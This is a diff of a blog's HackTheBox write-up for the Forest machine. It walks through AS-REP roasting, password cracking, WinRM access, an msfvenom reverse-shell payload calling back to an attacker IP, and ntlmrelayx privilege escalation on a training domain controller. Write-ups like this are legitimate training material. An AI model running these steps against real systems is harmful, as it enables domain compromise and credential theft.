@@ -1,162 +1,118 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Forest published by egre55 and mrb3n on October the 12th 2019. This box is a Windows machine classified as easy. The server is a Domain Controller with 24 open ports. We will use Winrm, bloodhound and impacket to get both the user flag and the &#34;root&#34; flag." />
-<meta name="keywords" content="security, boot2root, HTB, windows, winrm, PTH, bloodhound, impacket">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Forest"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Forest published by egre55 and mrb3n on October the 12th 2019. This box is a Windows machine classified as easy. The server is a Domain Controller with 24 open ports. We will use Winrm, bloodhound and impacket to get both the user flag and the &#34;root&#34; flag."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/03/htb-forest.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-03-21 17:10:00+01:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="windows"/>
-  <meta property="article:tag" content="winrm"/>
-  <meta property="article:tag" content="PTH"/>
-  <meta property="article:tag" content="bloodhound"/>
-  <meta property="article:tag" content="impacket"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Forest</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content='This is a writeup about a retired HacktheBox machine: Forest published by egre55 and mrb3n on October the 12th 2019. This box is a Windows machine classified as easy. The server is a Domain Controller with 24 open ports. We will use Winrm, bloodhound and impacket to get both the user flag and the "root" flag.' name="description"/>
+<meta content="security, boot2root, HTB, windows, winrm, PTH, bloodhound, impacket" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Forest" property="og:title"/>
+<meta content='This is a writeup about a retired HacktheBox machine: Forest published by egre55 and mrb3n on October the 12th 2019. This box is a Windows machine classified as easy. The server is a Domain Controller with 24 open ports. We will use Winrm, bloodhound and impacket to get both the user flag and the "root" flag.' property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/03/htb-forest.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-03-21 17:10:00+01:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="windows" property="article:tag"/>
+<meta content="winrm" property="article:tag"/>
+<meta content="PTH" property="article:tag"/>
+<meta content="bloodhound" property="article:tag"/>
+<meta content="impacket" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Forest</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-forest">HTB: Forest</h1>
-    <p>
+<header>
+<h1 id="htb-forest">HTB: Forest</h1>
+<p>
       Posted on 21 Mar 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 12 min read
+        • 12 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.03/forest_card.png" alt="Forest card" width="262"></p>
+</header>
+<div>
+<p><img alt="Forest card" class="align-left" src="/media/2020.03/forest_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/212">Forest</a> published by
 <a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a> and
@@ -166,8 +122,6 @@ This box is a Windows machine classified as easy.
 The server is a Domain Controller with 24 open ports.
 We will use Winrm, bloodhound and impacket to get both the user flag and the
 "root" flag.</p>
-
-
 <h1>Recon</h1>
 <p>We start with an nmap scan. 24 ports are open. Using the service detection with
 gather several informations about the box:</p>
@@ -208,15 +162,14 @@ PORT      STATE SERVICE      VERSION
 49915/tcp open  msrpc        Microsoft Windows RPC
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port53-TCP:V=7.80%I=7%D=10/24%Time=5DB150FF%P=x86_64-pc-linux-gnu%r(DNS
-SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
-SF:\x04bind\0\0\x10\0\x03&quot;);
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
 Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Oct 24 09:23:52 2019 -- 1 IP address (1 host up) scanned in 384.59 seconds
 </code></pre></div>
-
 <p>We use <code>getArch.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>
 to determine the machine Architecture, the machine is 64-bits.</p>
 <div class="highlight"><pre><span></span><code>python getArch.py -target 10.10.10.161
@@ -226,7 +179,6 @@ Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
 [*] Socket connect timeout set to 2 secs
 10.10.10.161 is 64-bi
 </code></pre></div>
-
 <p>We check the open ports using <a href="https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html">a useful website</a></p>
 <h2>Port 88: Kerberos</h2>
 <p>We need an account to exploit this port.</p>
@@ -281,7 +233,7 @@ Module options (auxiliary/scanner/smb/smb_enumusers):
 
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
-  RHOSTS     10.10.10.161     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+  RHOSTS     10.10.10.161     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
@@ -293,7 +245,6 @@ msf5 auxiliary(scanner/smb/smb_enumusers) &gt; run
 [*] 10.10.10.161:         - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 </code></pre></div>
-
 <h2>Getting NPUsers</h2>
 <p><code>UF_DONT_REQUIRE_PREAUTH</code></p>
 <blockquote>
@@ -308,7 +259,6 @@ andy
 mark
 santi
 </code></pre></div>
-
 <p>In order to use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>
 we need to add an entry in our <code>/etc/hosts</code>.</p>
 <div class="highlight"><pre><span></span><code>cat /etc/hosts
@@ -317,36 +267,33 @@ we need to add an entry in our <code>/etc/hosts</code>.</p>
 10.10.10.161    htb.local
 10.10.10.161    forest.htb.local
 </code></pre></div>
-
 <p>And we launch <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>.</p>
 <div class="highlight"><pre><span></span><code>python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format john
 Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
 
-[-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
-[-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
 $krb5asrep$svc-alfresco@HTB.LOCAL:bcd2217d8b5e6884e25d8b2860dd0380$40be3fda5f8fd984f9c576d5dfa33f37effc76b0fbff3ae28a747825c3559bfea4a6a23ad1c0add8ad61d149a5ccc2e79919de9b78e8720b3dc79af96364fb6f5d7e0235eb83850765023a30de6d172c82ec751f50f4c6e4971cb54a46e16ec2d3a41b9f44b6b8e85782d958c3ff665baa5b29d8c5b4516ec1b63f7c63b55c5fa74b7b1b5fe1fa04cddac6812d0ef37f1e25ab8e8005fe7f6ce949786435c41a2395e73e9bf1de57e3a2da12a00f9da25408e92a37a5ed2dacdbbf3846963000f7b2f8d337d152345a9cc7358b5d45224abeac179f081b9b329e549659da00ac791a7fde1a8c
-[-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
-[-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
-[-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] invalid principal syntax
 </code></pre></div>
-
 <p>We crack the password using john and the rockyou dictionary. The user's
 password is "s3rvice".</p>
 <div class="highlight"><pre><span></span><code>john hashes -w=~/tools/password_lists/rockyou.txt
-Warning: detected hash type &quot;krb5asrep&quot;, but the string is also recognized as &quot;krb5asrep-aes-opencl&quot;
-Use the &quot;--format=krb5asrep-aes-opencl&quot; option to force loading these as that type instead
+Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
+Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
 Will run 4 OpenMP threads
-Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Press 'q' or Ctrl-C to abort, almost any other key for status
 0g 0:00:00:02 11.59% (ETA: 11:52:21) 0g/s 913958p/s 913958c/s 913958C/s eddie707..eck1956
 s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)
 1g 0:00:00:04 DONE (2019-10-24 11:52) 0.2237g/s 914040p/s 914040c/s 914040C/s s401413..s3r1bu
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 </code></pre></div>
-
 <h2>MS14-068</h2>
 <p>In order to run MS14-068 we need the SUID of our user. We enumerate them using
 metasploit. Our user SID is <code>S-1-5-21-3072663084-364016917-1341370565-1147</code> (domain
@@ -360,7 +307,7 @@ Module options (auxiliary/scanner/smb/smb_lookupsid):
   ----       ---------------  --------  -----------
   MaxRID     4000             no        Maximum RID to check
   MinRID     500              no        Starting RID to check
-  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
@@ -395,14 +342,12 @@ msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; run
 [*] 10.10.10.161:445      - USER=mark RID=1151
 [*] 10.10.10.161:445      - USER=santi RID=1152
 </code></pre></div>
-
 <p>We can also try to get Users SPNs</p>
 <div class="highlight"><pre><span></span><code>python GetUserSPNs.py -request htb.local/svc-alfresco:s3rvice
 Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies
 
 No entries found
 </code></pre></div>
-
 <p>We add the DC to our <code>/etc/resolv.conf</code> and install <code>rdate</code> to have the same
 time as the DC.</p>
 <div class="highlight"><pre><span></span><code>cat /etc/resolv.conf
@@ -417,14 +362,12 @@ apt-get install rdate
 rdate -n htb.local
 Thu Oct 24 16:22:14 CEST 2019
 </code></pre></div>
-
 <p>I know have the same time as the DC (this is super important for tickets
 generation).</p>
 <div class="highlight"><pre><span></span><code>date &amp;&amp; rdate -n htb.local
 Thu 24 Oct 2019 04:24:55 PM CEST
 Thu Oct 24 16:24:55 CEST 2019
 </code></pre></div>
-
 <p>The exploitation of MS14-068 does not work.</p>
 <h2>Evil-winrm</h2>
 <p>As we so in the openport, the
@@ -497,7 +440,6 @@ Mode                LastWriteTime         Length Name
 *Evil-WinRM* PS C:\Users\svc-alfresco&gt; type Desktop\user.txt
 e5e4e&lt;redacted&gt;
 </code></pre></div>
-
 <h1>Getting root</h1>
 <h2>evil-winrm and binary</h2>
 <p>Using evil-Winrm we can also check the domain SID (and our user SID):</p>
@@ -509,38 +451,35 @@ User Name        SID
 ================ =============================================
 htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147
 </code></pre></div>
-
 <p>Using evil-winrm we can easily upload a binary using the <code>upload</code> function.
 Nevertheless I was not able to invoke the binary using the <code>Invoke-binary</code>
 command. Therefore I used a simple ruby script to get on the machine a launch a
 msfvenom meterprter:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">require</span> <span class="s1">&#39;winrm&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="nb">require</span> <span class="s1">'winrm'</span>
 
 <span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
-  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">&#39;http://10.10.10.161:5985/wsman&#39;</span><span class="p">,</span>
-  <span class="ss">user</span><span class="p">:</span> <span class="s1">&#39;svc-alfresco&#39;</span><span class="p">,</span>
-  <span class="ss">password</span><span class="p">:</span> <span class="s1">&#39;s3rvice&#39;</span><span class="p">,</span>
+  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">'http://10.10.10.161:5985/wsman'</span><span class="p">,</span>
+  <span class="ss">user</span><span class="p">:</span> <span class="s1">'svc-alfresco'</span><span class="p">,</span>
+  <span class="ss">password</span><span class="p">:</span> <span class="s1">'s3rvice'</span><span class="p">,</span>
 <span class="p">)</span>
 
-<span class="n">command</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
+<span class="n">command</span><span class="o">=</span><span class="s2">""</span>
 
 <span class="n">conn</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span>
-    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;exit</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="k">do</span>
-        <span class="nb">print</span> <span class="s2">&quot;PS &gt; &quot;</span>
+    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">"exit</span><span class="se">\n</span><span class="s2">"</span> <span class="k">do</span>
+        <span class="nb">print</span> <span class="s2">"PS &gt; "</span>
         <span class="n">command</span> <span class="o">=</span> <span class="nb">gets</span>
         <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="o">|</span>
             <span class="no">STDOUT</span><span class="o">.</span><span class="n">print</span> <span class="n">stdout</span>
             <span class="no">STDERR</span><span class="o">.</span><span class="n">print</span> <span class="n">stderr</span>
         <span class="k">end</span>
     <span class="k">end</span>
-    <span class="nb">puts</span> <span class="s2">&quot;Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">&quot;</span>
+    <span class="nb">puts</span> <span class="s2">"Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">"</span>
 <span class="k">end</span>
 </code></pre></div>
-
 <p>The msfvenom command to generate the meterpreter is the following:</p>
-<div class="highlight"><pre><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&quot;10.10.15.185&quot; LPORT=4444 -f exe &gt; shell.exe
+<div class="highlight"><pre><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="10.10.15.185" LPORT=4444 -f exe &gt; shell.exe
 </code></pre></div>
-
 <p>To catch the reverse meterpreter we use the <code>exploit/multi/handler</code> metasploit
 module. We can get a cmd shell using the <code>shell</code> command.</p>
 <h2>Bloodhound</h2>
@@ -550,7 +489,7 @@ groups and computers.
 We use a <a href="https://github.com/fox-it/BloodHound.py">bloodhound ingestor based on impacket</a>
 that allow to grab credentials remotly. But we get some error about DNS
 resolution probably because of our VPN configuration.</p>
-<div class="highlight"><pre><span></span><code>python ./bloodhound.py -d &#39;htb.local&#39; -dc 10.10.10.161 -gc 10.10.10.161 -u svc-alfresco -p s3rvice -v -ns 10.10.10.161 -c all
+<div class="highlight"><pre><span></span><code>python ./bloodhound.py -d 'htb.local' -dc 10.10.10.161 -gc 10.10.10.161 -u svc-alfresco -p s3rvice -v -ns 10.10.10.161 -c all
 DEBUG: Authentication: username/password
 DEBUG: Resolved collection methods: localadmin, rdp, dcom, acl, objectprops, session, group, trusts
 DEBUG: Using DNS to retrieve domain information
@@ -563,51 +502,48 @@ DEBUG: Using LDAP server: 10.10.10.161
 DEBUG: Using base DN: DC=htb,DC=local
 INFO: Connecting to LDAP server: 10.10.10.161
 Traceback (most recent call last):
-  File &quot;./bloodhound.py&quot;, line 5, in &lt;module&gt;
+  File "./bloodhound.py", line 5, in &lt;module&gt;
     bloodhound.main()
-  File &quot;/root/BloodHound.py/bloodhound/__init__.py&quot;, line 265, in main
+  File "/root/BloodHound.py/bloodhound/__init__.py", line 265, in main
     disable_pooling=args.disable_pooling)
-  File &quot;/root/BloodHound.py/bloodhound/__init__.py&quot;, line 68, in run
-    self.pdc.prefetch_info(&#39;objectprops&#39; in collect, &#39;acl&#39; in collect)
-  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 330, in prefetch_info
+  File "/root/BloodHound.py/bloodhound/__init__.py", line 68, in run
+    self.pdc.prefetch_info('objectprops' in collect, 'acl' in collect)
+  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 330, in prefetch_info
     self.get_domains(acl=acls)
-  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 204, in get_domains
+  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 204, in get_domains
     for entry in entries:
-  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 106, in search
+  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 106, in search
     self.ldap_connect()
-  File &quot;/root/BloodHound.py/bloodhound/ad/domain.py&quot;, line 60, in ldap_connect
+  File "/root/BloodHound.py/bloodhound/ad/domain.py", line 60, in ldap_connect
     q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)
-  File &quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&quot;, line 992, in query
+  File "/usr/lib/python2.7/dist-packages/dns/resolver.py", line 992, in query
     timeout = self._compute_timeout(start, lifetime)
-  File &quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&quot;, line 799, in _compute_timeout
+  File "/usr/lib/python2.7/dist-packages/dns/resolver.py", line 799, in _compute_timeout
     raise Timeout(timeout=duration)
 dns.exception.Timeout: The DNS operation timed out after 3.0016040802 seconds
 </code></pre></div>
-
 <p>We edit the code of <code>/root/BloodHound.py/bloodhound/ad/domain.py</code>:</p>
-<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">ldap_connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s1">&#39;ldap&#39;</span><span class="p">,</span> <span class="n">resolver</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
-        <span class="sd">&quot;&quot;&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">ldap_connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">protocol</span><span class="o">=</span><span class="s1">'ldap'</span><span class="p">,</span> <span class="n">resolver</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+        <span class="sd">"""</span>
 <span class="sd">        Connect to the LDAP service</span>
-<span class="sd">        &quot;&quot;&quot;</span>
-        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Connecting to LDAP server: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">hostname</span><span class="p">)</span>
+<span class="sd">        """</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'Connecting to LDAP server: </span><span class="si">%s</span><span class="s1">'</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">hostname</span><span class="p">)</span>
 
         <span class="c1"># Convert the hostname to an IP, this prevents ldap3 from doing it</span>
-        <span class="c1"># which doesn&#39;t use our custom nameservers</span>
+        <span class="c1"># which doesn't use our custom nameservers</span>
         <span class="c1">#q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)</span>
         <span class="c1">#for r in q:</span>
             <span class="c1">#ip = r.address</span>
-        <span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;10.10.10.161&quot;</span>
+        <span class="n">ip</span> <span class="o">=</span> <span class="s2">"10.10.10.161"</span>
 </code></pre></div>
-
 <p>The ingestor create a few JSON files:</p>
 <div class="highlight"><pre><span></span><code>ls *.json
 computers.json  domains.json  groups.json  sessions.json  users.json
 </code></pre></div>
-
 <p>We start the <code>neo4j</code> database, <code>bloodhound</code> and feed him the JSON data.</p>
 <p>When using the query "Shortest Paths to High Value Targets" we get the following
 graph:</p>
-<p><img alt="Bloodhound complete view" src="/media/2020.03/forest_01.png">.</p>
+<p><img alt="Bloodhound complete view" src="/media/2020.03/forest_01.png"/>.{: .image-process-article-image}</p>
 <h2>Exchange trusted subsystem and ntlmrelayx</h2>
 <p>Our <code>svc-alfresco</code> user got indirect right for the <code>Exchange trusted subsytem</code>
 group.
@@ -626,8 +562,8 @@ C:\Users\svc-alfresco\Documents&gt;net user created_01 M&lt;redacted&gt; /add /d
 net user created_01 Marteau69! /add /domain
 The command completed successfully.
 
-C:\Users\svc-alfresco\Documents&gt;net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot;
-net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot;
+C:\Users\svc-alfresco\Documents&gt;net group "EXCHANGE TRUSTED SUBSYSTEM"
+net group "EXCHANGE TRUSTED SUBSYSTEM"
 Group name     Exchange Trusted Subsystem
 Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Exchange configuration, as well as user accounts and groups. This group should not be deleted.
 
@@ -638,11 +574,10 @@ EXCH01$                  sol                      svc-alfresco
 The command completed successfully.
 
 
-C:\Users\svc-alfresco\Documents&gt;net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot; created_01 /add
-net group &quot;EXCHANGE TRUSTED SUBSYSTEM&quot; created_01 /add
+C:\Users\svc-alfresco\Documents&gt;net group "EXCHANGE TRUSTED SUBSYSTEM" created_01 /add
+net group "EXCHANGE TRUSTED SUBSYSTEM" created_01 /add
 The command completed successfully.
 </code></pre></div>
-
 <p>We then launch <a href="https://github.com/SecureAuthCorp/impacket/">impacket's ntlmrelayx.py</a>
 with the <code>escalate-user</code> parameter. We try it by authenticating in our browser on 127.0.0.1.</p>
 <div class="highlight"><pre><span></span><code>ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user created_01
@@ -668,7 +603,7 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [*] HTTPD: Client requested path: /
 [*] HTTPD: Client requested path: /
 [*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED
-[*] Enumerating relayed user&#39;s privileges. This may take a while on large domains
+[*] Enumerating relayed user's privileges. This may take a while on large domains
 [*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
 [*] HTTPD: Client requested path: /favicon.ico
 [*] HTTPD: Client requested path: /favicon.ico
@@ -680,21 +615,20 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [*] Try using DCSync with secretsdump.py and this user :)
